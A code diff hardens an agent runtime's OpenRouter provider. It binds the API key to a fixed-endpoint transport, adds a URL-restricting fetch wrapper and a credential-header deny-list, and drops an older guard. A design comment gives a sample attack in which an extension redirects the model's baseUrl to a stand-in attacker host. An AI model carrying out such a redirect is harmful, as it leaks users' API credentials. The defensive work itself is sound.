@@ -35,6 +35,7 @@
 
 import { readFileSync } from "node:fs";
 import { join } from "node:path";
+import { streamSimple as openaiCompletionsStreamSimple } from "@earendil-works/pi-ai/api/openai-completions";
 import {
   type AgentSessionRuntime,
   type CreateAgentSessionRuntimeFactory,
@@ -93,26 +94,135 @@ export const SETUP_TOOL_POLICY: ToolPolicy = {
 // the on-disk files takes effect — and any on-disk `openrouter` entry is refused
 // rather than merged.
 
+// ── openrouter: bob OWNS the provider (bob#183 round 3; round 6: transport) ────
+//
+// Round 2 pinned the endpoint with a CHECK against `.pi-agent/models.json` — and
+// a check that has to enumerate pi's precedence rules will always lag them. Round
+// 3 changed the SHAPE to a construction-time registration. Round 6 changes it
+// AGAIN, because a capability can still (1) call `pi.setModel({...ctx.model,
+// baseUrl: "https://evil.example/api/v1"})` — pi sends to THAT model's URL while
+// bob's check reads the unchanged registry — or (2) race an async re-assertion
+// that runs on `before_provider_request`. So the KEY IS BOUND TO THE ENDPOINT AT
+// TRANSPORT and never enters pi: bob registers `openrouter` with a fixed,
+// NON-SECRET placeholder key, and the real `OPENROUTER_API_KEY` lives ONLY in
+// bob's transport function, which sends only to https://openrouter.ai/api/v1.
+
 /** The one endpoint an openrouter session may reach. */
 export const OPENROUTER_BASE_URL = "https://openrouter.ai/api/v1";
+
+/** The api id pi must resolve for the openrouter model (and the transport). */
+export const OPENROUTER_API = "openai-completions";
+
+/** The NON-SECRET placeholder pi holds in place of the real key. */
+export const OPENROUTER_API_KEY_PLACEHOLDER = "bob-openrouter-placeholder-not-a-secret";
 
 /** pi's extension provider-definition shape (not exported by pi at the root). */
 export type OpenrouterProviderConfig = Parameters<ModelRuntime["registerProvider"]>[1];
 
+/** Header names bob refuses to let a caller supply on an openrouter request. */
+const CREDENTIAL_HEADER =
+  /^(authorization|proxy-authorization|x-api-key|api-key|x-auth-token|cookie)$/i;
+
+/**
+ * The fetch wrapper the transport delegates through: it refuses, BEFORE calling
+ * `baseFetch`, any request URL that does not start with `baseUrl + "/"`. Exported
+ * so a test can call it directly (round 6 (t5)).
+ */
+export function guardedOpenrouterFetch(
+  baseUrl: string,
+  baseFetch: typeof globalThis.fetch = globalThis.fetch,
+): typeof globalThis.fetch {
+  return ((url: unknown, init?: unknown) => {
+    const u =
+      typeof url === "string"
+        ? url
+        : url instanceof Request
+          ? url.url
+          : String((url as { url?: unknown })?.url ?? url);
+    if (!u.startsWith(`${baseUrl}/`)) {
+      return Promise.reject(
+        new Error(
+          `bob: refusing an openrouter request to ${u} — bob's openrouter transport sends only to ${baseUrl}/`,
+        ),
+      );
+    }
+    return baseFetch(url as never, init as never);
+  }) as typeof globalThis.fetch;
+}
+
+/**
+ * bob's OpenRouter TRANSPORT (round 6). pi calls the registered `streamSimple` as
+ * `streamSimple(prepared.model, context, prepared.options)` with the FINAL model
+ * and options (pi-coding-agent `core/provider-composer.js` streamWith → an
+ * extension's streamSimple when `model.api === extension.api`). This function is
+ * where the real key lives; it
+ *   (a) refuses, by THROWING before any network call, unless
+ *       `prepared.model.baseUrl === baseUrl` AND `prepared.model.api === api`;
+ *   (b) refuses if `options.headers` carries any credential-bearing header
+ *       (case-insensitive) — bob sets the Authorization itself;
+ *   (c) delegates to pi-ai's openai-completions `streamSimple` with `apiKey` set
+ *       to the real key and `fetch` set to a wrapper that refuses any request URL
+ *       not under `baseUrl + "/"`.
+ */
+export function openrouterTransport(input: {
+  baseUrl: string;
+  api: string;
+  apiKey: string;
+  fetchImpl?: typeof globalThis.fetch;
+}): NonNullable<OpenrouterProviderConfig["streamSimple"]> {
+  const baseFetch = input.fetchImpl ?? globalThis.fetch;
+  // A SECOND check, on the request the SDK actually makes.
+  const guardedFetch = guardedOpenrouterFetch(input.baseUrl, baseFetch);
+
+  const transport = (model: unknown, context: unknown, options?: unknown) => {
+    const prepared = (model ?? {}) as { baseUrl?: unknown; api?: unknown };
+    if (prepared.baseUrl !== input.baseUrl || prepared.api !== input.api) {
+      throw new Error(
+        `bob: refusing an openrouter request to ${JSON.stringify(prepared.baseUrl)} (api ${JSON.stringify(prepared.api)}) — bob's openrouter transport sends only to ${input.baseUrl} (${input.api})`,
+      );
+    }
+    const opts = (options ?? {}) as { headers?: Record<string, string | null> };
+    for (const name of Object.keys(opts.headers ?? {})) {
+      if (CREDENTIAL_HEADER.test(name) && opts.headers?.[name] != null) {
+        throw new Error(
+          `bob: refusing an openrouter request with a caller-supplied ${name} header — bob sets the openrouter Authorization itself`,
+        );
+      }
+    }
+    return openaiCompletionsStreamSimple(
+      prepared as never,
+      context as never,
+      {
+        ...(opts as object),
+        apiKey: input.apiKey,
+        fetch: guardedFetch,
+      } as never,
+    );
+  };
+  return transport as unknown as NonNullable<OpenrouterProviderConfig["streamSimple"]>;
+}
+
 /**
  * The provider definition bob builds IN MEMORY for `openrouter`: the FIXED
- * endpoint, the API key passed EXPLICITLY (never read from disk), the
- * openai-completions api, and the declared model with NO per-model `baseUrl`.
+ * endpoint, the api, and the declared model with NO per-model `baseUrl`. pi holds
+ * only the NON-SECRET placeholder key; the real key lives in the transport.
  */
 export function buildOpenrouterProvider(input: {
   model: string;
   apiKey: string;
+  fetchImpl?: typeof globalThis.fetch;
 }): OpenrouterProviderConfig {
   return {
     name: "openrouter",
     baseUrl: OPENROUTER_BASE_URL,
-    apiKey: input.apiKey,
-    api: "openai-completions",
+    apiKey: OPENROUTER_API_KEY_PLACEHOLDER,
+    api: OPENROUTER_API,
+    streamSimple: openrouterTransport({
+      baseUrl: OPENROUTER_BASE_URL,
+      api: OPENROUTER_API,
+      apiKey: input.apiKey,
+      ...(input.fetchImpl !== undefined ? { fetchImpl: input.fetchImpl } : {}),
+    }),
     models: [
       {
         id: input.model,
@@ -226,29 +336,30 @@ export async function assertOpenrouterRuntimeUnchanged(
       problems.push(`the model entry carries a per-model baseUrl (${m0.baseUrl})`);
     }
   }
-  // The key the request would carry. pi resolves it through the composed auth.
-  // STRICT (round 5, item 2): a resolution FAILURE or an UNDEFINED key is a
-  // refusal naming the cause — bob must be able to PROVE the key is the
-  // OPENROUTER_API_KEY value, so an undefined resolved key is not accepted.
+  // The key pi holds. Round 6: pi holds ONLY the NON-SECRET placeholder; the real
+  // key lives in the transport. STRICT (round 4 item 4): a resolution that throws
+  // ANY value — including `throw undefined` — refuses via a SEPARATE caught flag,
+  // and a non-string or non-placeholder key refuses.
   let auth: Awaited<ReturnType<ModelRuntime["getAuth"]>> | undefined;
-  let authError: unknown;
+  let caught = false;
   try {
     auth = await modelRuntime.getAuth(providerId);
   } catch (err) {
-    authError = err;
-  }
-  if (authError !== undefined) {
+    caught = true;
     problems.push(
-      `the auth resolution for openrouter threw (${authError instanceof Error ? authError.message : String(authError)}) — bob cannot prove the key is the OPENROUTER_API_KEY value`,
+      `the auth resolution for openrouter threw (${err instanceof Error ? err.message : String(err)}) — bob cannot prove pi holds its placeholder`,
     );
-  } else {
+  }
+  if (!caught) {
     const resolvedKey = auth?.auth?.apiKey;
     if (typeof resolvedKey !== "string") {
       problems.push(
-        "the resolved openrouter apiKey is undefined — bob cannot prove the key is the OPENROUTER_API_KEY value",
+        "the resolved openrouter apiKey is undefined — bob cannot prove pi holds its placeholder",
       );
     } else if (resolvedKey !== input.apiKey) {
-      problems.push("the resolved apiKey is not the OPENROUTER_API_KEY value");
+      problems.push(
+        "the resolved openrouter apiKey is not bob's placeholder — something replaced it",
+      );
     }
   }
   if (problems.length > 0) {
@@ -353,56 +464,6 @@ export function guardOpenrouterRegistration(modelRuntime: ModelRuntime): void {
   }
 }
 
-/**
- * The PER-TURN re-assertion of the openrouter provider, as an INLINE pi extension
- * (round 5, item 1): it runs on `before_provider_request` — the SAME place the #145
- * contract guard runs, i.e. before every AGENT request — and re-checks that the
- * request-effective openrouter provider is still bob's (baseUrl, api, no per-model
- * `baseUrl`, and the key identical). A failed check does not throw (pi catches an
- * extension handler's throw and continues); it disposes and ends the process,
- * naming the reason — the same path a failed audit takes.
- */
-export function createOpenrouterGuardExtension(input: {
-  modelRuntime: ModelRuntime;
-  model: string;
-  expected: OpenrouterProviderConfig;
-  apiKey: string;
-  deps: () => ContractGuardDeps;
-}): InlineExtension {
-  const factory = (pi: {
-    on(event: "before_provider_request", handler: () => unknown): void;
-  }): void => {
-    pi.on("before_provider_request", () => {
-      const deps = input.deps();
-      void (async () => {
-        try {
-          await assertOpenrouterRuntimeUnchanged(input.modelRuntime, {
-            model: input.model,
-            expected: input.expected,
-            apiKey: input.apiKey,
-          });
-        } catch (err) {
-          const message = `bob: the effective openrouter provider is no longer bob's before a request — ${
-            err instanceof Error ? err.message : String(err)
-          }; disposing the session and ending the process before another turn can run.`;
-          try {
-            deps.dispose();
-          } catch {
-            // the failed check is the error that matters
-          }
-          try {
-            deps.log(message);
-          } finally {
-            deps.exit(1);
-          }
-        }
-      })();
-      return undefined;
-    });
-  };
-  return { name: "bob-openrouter-guard", factory, hidden: true };
-}
-
 // Diagnostics + the process-exit seam, injectable so a test can watch a failed
 // audit end the session without killing the test runner.
 export interface SessionDeps {
@@ -455,12 +516,9 @@ export function isolatedLoaderOptions(
   config: Pick<RunSessionConfig, "appendSystemPrompt" | "extensionSources" | "piAgentDir"> & {
     contractBlock?: string;
   },
-  extra?: { guard?: InlineExtension; openrouterGuard?: InlineExtension },
+  extra?: { guard?: InlineExtension },
 ): LoaderOptions {
   const contractBlock = config.contractBlock;
-  const inlineGuards = [extra?.guard, extra?.openrouterGuard].filter(
-    (g): g is InlineExtension => g !== undefined,
-  );
   return {
     // The only extensions are the declared capabilities' paths. With
     // noExtensions the loader uses exactly these (temporary CLI scope) and
@@ -479,7 +537,7 @@ export function isolatedLoaderOptions(
     ...(contractBlock !== undefined
       ? { appendSystemPromptOverride: appendContractOverride(contractBlock) }
       : {}),
-    ...(inlineGuards.length > 0 ? { extensionFactories: inlineGuards } : {}),
+    ...(extra?.guard !== undefined ? { extensionFactories: [extra.guard] } : {}),
   };
 }
 
@@ -803,27 +861,18 @@ export function createBobRuntimeFactory(input: BobFactoryInput): CreateAgentSess
     // refuse any on-disk entry, so no `models.json`/`auth.json` field can
     // redirect the endpoint or the key. Runs BEFORE any session exists.
     let openrouterProvider: OpenrouterProviderConfig | undefined;
-    let openrouterKey = "";
-    let openrouterGuard: InlineExtension | undefined;
     if (config.provider === "openrouter") {
       openrouterProvider = registerOpenrouterProvider(modelRuntime, {
         model: config.model,
         piAgentDir: agentDir,
       });
-      openrouterKey = requireOpenrouterApiKey();
       // GUARD THE VERB (round 5, item 1): bob registered its own provider; wrap
       // the runtime's registration verbs so a LATER registerProvider("openrouter")
       // — from session_start, before_agent_start, or a print-mode bind — is
-      // refused BEFORE it takes effect. The per-turn re-assertion runs on
-      // `before_provider_request`, the same place the contract guard runs.
+      // refused BEFORE it takes effect. Kept as a SECOND layer (round 6): the key
+      // is no longer in pi, so a re-registered provider carries only the
+      // placeholder.
       guardOpenrouterRegistration(modelRuntime);
-      openrouterGuard = createOpenrouterGuardExtension({
-        modelRuntime,
-        model: config.model,
-        expected: openrouterProvider,
-        apiKey: openrouterKey,
-        deps: () => guardDeps,
-      });
     }
     const services = await createAgentSessionServices({
       cwd,
@@ -832,10 +881,7 @@ export function createBobRuntimeFactory(input: BobFactoryInput): CreateAgentSess
       modelRuntime,
       resourceLoaderOptions: isolatedLoaderOptions(
         { ...config, ...(contractBlock !== undefined ? { contractBlock } : {}) },
-        {
-          ...(guard !== undefined ? { guard } : {}),
-          ...(openrouterGuard !== undefined ? { openrouterGuard } : {}),
-        },
+        { ...(guard !== undefined ? { guard } : {}) },
       ),
     });
     // bob asked for these extensions explicitly: a declared capability whose
@@ -844,14 +890,15 @@ export function createBobRuntimeFactory(input: BobFactoryInput): CreateAgentSess
     // And so is the guard: an inline extension that pi failed to load would
     // leave every request unchecked while the session looked healthy.
     assertContractGuardLoaded(services.resourceLoader, guard);
-    // Round 4, item 2: assert the EFFECTIVE openrouter provider AFTER the
-    // services exist — a capability's own `registerProvider` during load would
-    // otherwise move the endpoint or the key without bob noticing.
+    // Round 4, item 2 / round 6: assert the EFFECTIVE openrouter provider AFTER
+    // the services exist — a capability's own `registerProvider` during load would
+    // otherwise move the endpoint or the key without bob noticing. pi must hold
+    // only bob's PLACEHOLDER key.
     if (config.provider === "openrouter" && openrouterProvider !== undefined) {
       await assertOpenrouterRuntimeUnchanged(modelRuntime as ModelRuntime, {
         model: config.model,
         expected: openrouterProvider,
-        apiKey: openrouterKey,
+        apiKey: OPENROUTER_API_KEY_PLACEHOLDER,
       });
     }
 
